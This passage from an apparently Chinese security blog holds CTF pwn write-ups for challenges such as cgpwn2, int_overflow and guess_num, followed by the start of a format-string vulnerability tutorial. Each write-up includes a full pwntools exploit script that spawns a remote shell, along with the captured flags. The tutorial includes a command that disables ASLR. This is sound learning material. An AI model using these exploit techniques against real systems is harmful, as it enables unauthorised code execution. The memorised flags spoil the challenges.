payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本得到结果 注意 因为程序是执行了 <em>/bin/sh</em>也就是打开了个终端 需要我们自己去执行获得flag..别说了..刚开始菜鸡等了半天..</p>
<p><img src="https://ae01.alicdn.com/kf/Ha764f1cb5400434a968e2aaf0cdbf41cw.png" alt></p>
<p>得到flag:cyberpeace{c07387d32eabb849023878563a5400ef}</p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>习惯性起手式<br><img src="https://ae01.alicdn.com/kf/Hc6b5266b6cb14cf395076de26d6e009ci.png" alt></p>
<p>一样没有开地址随机化 直接载入IDA </p>
<p><img src="https://ae01.alicdn.com/kf/Hce1df255f000422f9bb805cb6d16c2b7V.png" alt></p>
<p><img src="https://ae01.alicdn.com/kf/H4584d6b417144896b3663437a7cb38aeI.png" alt></p>
<p>本来没啥头绪 后来发现函数表中有敏感函数<em>system</em> 那大致思路形成 就是和上题差不多 但是我们在覆盖返回地址的同时 直接把栈修改成正常调用system(“/bin/sh”)的样子 同时发现在程序内存中也存有 <em>/bin/sh</em> 那开始写脚本吧<br><img src="https://ae01.alicdn.com/kf/Hf1c2df51b87d40cca5c3cea1ef3b77e42.png" alt></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level_2'</span><span class="token punctuation">)</span>
sysadr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
shadr<span class="token operator">=</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"58030"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x8c</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sysadr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>shadr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<blockquote>
<p>这里解释下payload吧 因为在函数调用时除去保存现场外 先入栈的就是返回地址 这里的 <em>p32(0)</em> 就是充当返回地址用的 当然因为此处我们直接打开了终端 根本就不需要程序返回 所以随便写就好了 然后就是参数入栈 具体是从左向右 还是从右向左是调用协议规定的 这需要具体程序具体分析 </p>
</blockquote>
<p>执行脚本得到结果</p>
<p><img src="https://ae01.alicdn.com/kf/Hafe199f5112746a8a6d3ec0c1ac63bf1o.png" alt></p>
<p>flag:cyberpeace{984f929f5fdae818c75ee89278e36753}</p>
<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>基本起手式 查保护 发现除了地址随机化 其他保护全开<br><img src="https://ae01.alicdn.com/kf/H4d812ba85367425c97e4366c35709200q.png" alt></p>
<p>先尝试着跑了一遍 发现有点像一个古董级别的RPG游戏…没啥思路</p>
<p>那就不多说了 直接载入IDA吧<br><img src="https://ae01.alicdn.com/kf/H0b9af83d49574ea0bb152aec87e3395f4.png" alt></p>
<p>主函数没啥看的 主要就是泄漏了一个数组的地址 继续向sub_400D72步入</p>
<p><img src="https://ae01.alicdn.com/kf/Hd7e0574cc9624bec9e0b0d536347cf0dR.png" alt></p>
<p>这里就是常见角色了 稍微步入看下 发现sub_400A7D函数 就是仅仅是在输出和限制我们的选择 如果想继续玩下去就得输入east 没什么好分析的 步入sub_400BB9进行分析 </p>
<p><img src="https://ae01.alicdn.com/kf/H5d2aa44863bc44a2957223dfad87090aJ.png" alt></p>
<p>哦吼 看了这么久终于看见一个漏洞 先记录下来 在sub_400BB9中存在格式化字符串漏洞 但是就代码阅读到这里 还是没什么利用思路 继续向下看 终于在sub_400CA6发现关键判断</p>
<p><img src="https://ae01.alicdn.com/kf/H0d55785e0dad447a9633290b4ad3f6c7w.png" alt></p>
<p>通过慢慢查找 发现在函数中比对的 a1和a1[1] 其实就是主函数刚开始泄漏地址的数组 菜鸡这里当时卡了很久…真的不知道if内是在干啥..后来通过大佬指点 看到将指针v1强制转换为函数类型..简单来说就是执行函数</p>
<p>看到这里那基本思路形成了 首先是需要我们通过格式化字符串漏洞 将刚开始的数组值修改为一样的 然后写入shellcode 最后利用if内语句执行即可 那么首先需要先写脚本看下主机处的回显位</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1234"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>运行脚本 这里我的回显位是8</p>
<p><img src="https://ae01.alicdn.com/kf/H2ae5d11d296e408c933d80378f1273bfC.png" alt></p>
<p>那么接下来就是写脚本利用格式化字符串漏洞了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>
secret0<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>secret0<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"%85c%7$n"</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre>
<p>执行到这一步已经是利用过格式化字符串漏洞 将数组的值修改为一致的了</p>
<blockquote>
<p>%85c%7$n是个啥玩意</p>
<p>这样写是为了更方便的利用格式化字符串漏洞<br>我们都知道 格式化字符串是可以修改数据的值的 也就是利用%n前面字符数来修改<br>但是大部分情况下 都是需要填充十几个 甚至上百个字符 所以创造出了这种格式</p>
<p>格式:%需要修改成为的值c%回显位$格式化字符</p>
</blockquote>
<p>接下来就是输入shellcode了 这方面是菜鸡的短板…经过大佬知道学会了用pwntools生成shellcode</p>
<p>完整脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>
secret0<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>secret0<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"%85c%7$n"</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本得到终端 自己cat flag即可<br><img src="https://ae01.alicdn.com/kf/H76c4f169f6624dbc8e598d09887a382bf.png" alt></p>
<p>得到flag:cyberpeace{d35672c5e758a40ea0c05f6dbbe77015}</p>
<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>老样子 查保护 看位数</p>
<p><img src="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" alt></p>
<p>保护开得很全… 先跑一下 先是输入名字 然后输出自己猜的数…果断GG掉了…那载入IDA吧…</p>
<p><img src="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" alt></p>
<p>主函数很耿直 几乎没有跳转 跟进sub_C3E看下 发现就是cat flag 那么主要就是主函数的执行了</p>
<blockquote>
<p>刚开始菜鸡很是头疼 这个随机数怎么搞定 后来了解了下rand函数的具体原理</p>
<p>rand函数是伪随机函数 他每个”种子”对应一个固定的随机值 所以在使用rand函数之前会使用srand来随机生成一个种子</p>
</blockquote>
<p>仔细一看 哦吼..大胆的作者敢用gets读入..八成是溢出了..再配合srand函数的原理 很容易确定思路</p>
<p>先是利用溢出 覆盖掉种子的值 从而达到控制随机数的目的 那么就开始写脚本吧 首先确定偏移地址</p>
<p>双击v9进入栈图 我们的目的是覆盖seed的值</p>
<p><img src="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" alt></p>
<p>可以简单计算出偏移量是20 那么写出脚本即可</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"53030"</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#print(elf.libc)</span>
libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      num<span class="token operator">=</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
      sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'number:'</span><span class="token punctuation">)</span>
      sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<blockquote>
<p>这个脚本的关键就是如何在python中使用c的函数 我选择的解决方法是 使用ctypes库 </p>
<p>这个库可以方便我们直接在程序中使用C的函数 但是我们首先要确定libc共享库的版本号 这里我是用的是ldd指令进行的查询<br>如果懒的话也可以通过在程序中使用elf.libc来获取</p>
<p><img src="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" alt></p>
</blockquote>
<p>运行脚本即可</p>
<p><img src="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" alt></p>
<p>得到flag:cyberpeace{de6b4ebe0aab9472c1dda38729fc76ef}</p>
<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><img src="https://ae01.alicdn.com/kf/H8e47c49cc69745ef8f0dd69edf28ec14I.png" alt></p>
<p>先跑下 发现是一个类似登陆的系统 要求输入密码bulabula…没啥直接思路</p>
<p>32位的程序 丢进IDA看下程序流程</p>
<p><img src="https://ae01.alicdn.com/kf/H1e6e4439979b4a85a11b2a8ff19862ber.png" alt></p>
<p>主函数还是一样的寂寞..什么有价值的都没有呢…但是在函数表里发现一个敏感函数what_is_this</p>
<p><img src="https://ae01.alicdn.com/kf/H3c6b0310b34e46738863aee4be442848Z.png" alt></p>
<p>那起码能确定肯定是溢出类的题目了 最后劫持程序流向what_is_this函数</p>
<p>跟进login函数 也没啥发现 check函数主要就是录入了用户名和密码 本来看见read函数 以为溢出点就在这里了..打开栈图一看发现覆盖不到返回地址…继续向下跟进check_passwd函数</p>
<p><img src="https://ae01.alicdn.com/kf/H431013789c004197b1ef8984139dbefbQ.png" alt></p>
<p><img src="https://ae01.alicdn.com/kf/Hdf7b08d1a7d94d128d68c1a1df79bc7fC.png" alt></p>
<p>简单解释下程序流程 这里的s就是之前我们录入的密码 check_passwd函数首先检测s的长度 要求s的长度在3到8之间</p>
<p>在走过if后 发现另外一个敏感函数 <kbd>strcpy</kbd> 这个函数一样不检测长度 可以直接覆盖无限大的空间..<br>查看一下栈图 dest函数到返回地址的距离是14个字节 但是我们的密码最多只能输入8位…这时候注意到题目名..整型溢出..百度了一下..</p>
<p>注意一下变量v3的定义方式 是一个八位的无符号整型数 也就是最大255 如果大于255 就会清零从头计数 那么基本思路就有了 简单来说就是将密码长度设为258-263位之间 同时对应好位置 直接把返回地址覆写即可</p>
<p>那么..日常码脚本..</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"34902"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your username:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Dust"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:"</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>
what_is_this<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'what_is_this'</span><span class="token punctuation">]</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>what_is_this<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xE7</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本即可</p>
<p><img src="https://ae01.alicdn.com/kf/H646dc7782e7f4029a6dadd5251eda1f65.png" alt></p>
<p>得到flag:cyberpeace{85f5a37cbe589f048f01f85b41e6f421}</p>
<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>保护</p>
<p><img src="https://ae01.alicdn.com/kf/H291662a9388b451f96af988216f86aa5A.png" alt></p>
<p>运行程序啥都看不出来 就让输入个用户名和留言 拖入IDA吧</p>
<p><img src="https://ae01.alicdn.com/kf/He43b12a532d641dba8da9e19bcd2dc86d.png" alt></p>
<p>主函数什么都没有 直接往下跟</p>
<p><img src="https://ae01.alicdn.com/kf/Hec3d211d6b3c4119b1af6b27a21cf1feE.png" alt></p>
<p>在hello函数的最后发现敏感函数gets 不用纠结函数上面写的是在干嘛..反正对函数主体以及我们的输入没有关系 不用管..同时在函数表中发现<kbd>system</kbd>函数 那么基本思路明确 通过gets函数劫持程序流向system函数 直接在栈里构造出来system函数调用<kbd>/bin/bash</kbd>的情况即可</p>
<p>接下来就是脚本了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"34584"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#sh=process("./cgpwn2")</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"hello,you can leave some message here:"</span><span class="token punctuation">)</span>
sysaddr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binaddr<span class="token operator">=</span><span class="token number">0x0804A080</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x2A</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binaddr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<blockquote>
<p>这里解释下脚本为什么在名字部分写入/bin/sh而binaddr又是什么东西<br>因为在编写脚本的时候 我们不可能直接将字符串写入栈 让system函数去调用 需要我们提前将/bin/sh写入程序 而上面的名字录入就是一个最好的位置</p>
<p>我们可以看一下name变量存在的位置</p>
<p><img src="https://ae01.alicdn.com/kf/H159c90dd87c9421292ac5b7a69ce4e34o.png" alt></p>
<p>可以明确看到 name变量是存在bss段的静态变量 我们完全可以把/bin/sh先写入name变量 然后让system函数去调用</p>
</blockquote>
<p>执行脚本即可</p>
<p><img src="https://ae01.alicdn.com/kf/Ha63ae34bd918413e852ef834e5940b7em.png" alt></p>
<p>得到flag:cyberpeace{d0a41c2065b348cf58cbb94c96ee57e6}</p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level_3"></a>level_3</h2><p>该题附件缺失 少了一个libc文件 没啥办法..略..</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> WP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> WP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[格式化字符串漏洞]]></title>
      <url>/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/</url>
      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>对于正常且安全的使用==printf函数==是这样操作的</p>
<pre><code>#include <stdio.h>

int main(void)
{
    int n=5;
    printf("%d",n);
    return 0;
}</code></pre><p>但是偏偏有些懒人喜欢偷懒 少打两个字写成这样子</p>
<pre><code>#include <stdio.h>

int main(void)
{
    char a[]="qwerdf";
    printf(a);
    return 0;
}</code></pre><p>对于printf函数来说 它的函数原型是</p>
<blockquote>
<p>printf(“格式化字符串”,参量1,参量2….)<br>如果输出成功返回输出的字数 如果输出失败则返回负数<br>格式化字符串 可以是以’%’开头的后跟特定字符来确定输出样式的 也可以是正常的字符串</p>
</blockquote>
<p>但是由于函数调用的关系 实参和形参结合的顺序是从左向右结合的 所以函数这样写也是可以正常输出的<br><img src="https://img-blog.csdnimg.cn/20190923193449792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=" ">以上代码 本身没有什么问题 但是如果用户可以控制输入的话 就会造成一些意想不到的结果</p>
<pre><code>#include <stdio.h>
int main(void)
{
    char a[100];
    scanf("%s",a);
    printf(a);
    return 0;
 } </code></pre><p><img src="https://img-blog.csdnimg.cn/20190923193909689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=" "><br>我们可以通过测试发现 程序输出了一些奇怪的输出 我们载入x32dbg查看下 程序到底输出的是什么<br>通过观察栈中 我们发现 其实程序输出的就是栈中的数据<br><img src="https://img-blog.csdnimg.cn/20190923195130178.png" alt><br>造成这种结果的原因是 因为我们输入的%x 在我们用不安全的方式调用printf函数的时候 没有明确表示出哪里的参数是空缺的 这就会造成系统自动从左往右进行匹配 我们输入的%x 又正好是在 “格式化字符串” 这个参数内 系统就会将他当成默认的%x来进行输出</p>
<blockquote>
<p>同样的 如果我们输入的是%s 且在内存地址上正好有个字符串 我们就可以将内存中的字符串输出出来</p>
</blockquote>
<p>通过这种方式 我们就可以做到栈数据泄露</p>
<h2 id="内存读取"><a href="#内存读取" class="headerlink" title="内存读取"></a>内存读取</h2><blockquote>
<p>在进行以下版块的实验前 请先关闭掉Linux系统的PIE(空间分布随机化) 不然会造成程序变量地址一直在变动<br> 可以在==root==权限下 使用以下命令关闭<br>echo 0 > /proc/sys/kernel/randomize_va_space</p>
</blockquote>
<p>首先我们需要明确一点 所有的局部变量都是在栈中存放着 所以如果我们能泄露出来某个字符串的地址 我们就有机会直接读取到内存中这个字符串的值 </p>
<p>首先给出利用代码</p>
<blockquote>
<p>   关于如何写入地址的问题 菜鸡也不会在scanf的情况下写入地址 可能只有对照的ASCII码表进行输入了吧<br>所以在接下来的程序中 以命令行参数的形式向程序输入<br>因为 在命令行中 可以使用printf函数来将shellcode编码转换成字符</p>
</blockquote>
<pre><code>#include <stdio.h>
#include <string.h>
int main(int argc,char **argv)
{
    char a[100];
    strcpy(a,argv[1]);
    char flag[100]={"flag"};  
    printf("%p\n",flag);
    printf(a);
    printf("\n");
    return 0;
}</code></pre><p>在这里我们是直接将flag数组的地址直接输出出来 相当于泄露了关键字符串的地址吧…<br>因为==所有的局部变量都是存放在栈中的== 首先第一步就是需要遍历栈中数据找到输入的数据 以达到后面控制输入变量的目的<br><img src="https://img-blog.csdnimg.cn/20190923212726366.png" alt>这里发现栈中数据的第九位正好就是我们输入的数据 为了方便查看 也可以使用以下方式来查看第n位的回显</p>
<blockquote>
<p>%< Number >$ formot string<br>注意此方法仅适用于Linux系统 且在命令行中使用需要转义$</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20190923213014599.png" alt><br>在这里就可以控制输入的参数 将输入改为flag字符串的地址 同时根据上面所提过的 将%08x更改为%s直接读取到flag字符串具体的值<br><img src="https://img-blog.csdnimg.cn/2019092321331572.png" alt><br>根据以上操作 如果条件允许的话 就可以做到任意内存读取</p>
<h2 id="内存修改"><a href="#内存修改" class="headerlink" title="内存修改"></a>内存修改</h2><blockquote>
<p>首先先介绍一种不常见的 格式说明符’%n’ 它的作用并不是像%c %d那样说明格式 而是将%n之前的字符个数赋值给一个变量</p>
</blockquote>
<p>这里先给出实验代码</p>
<pre><code>#include <stdio.h>
#include <string.h>
int main(int argc,char **argv)
{
    char a[100];
    static int b=0;
    strcpy(a,argv[1]);
    printf("The addr of b is %p\n",&b);
    printf(a);
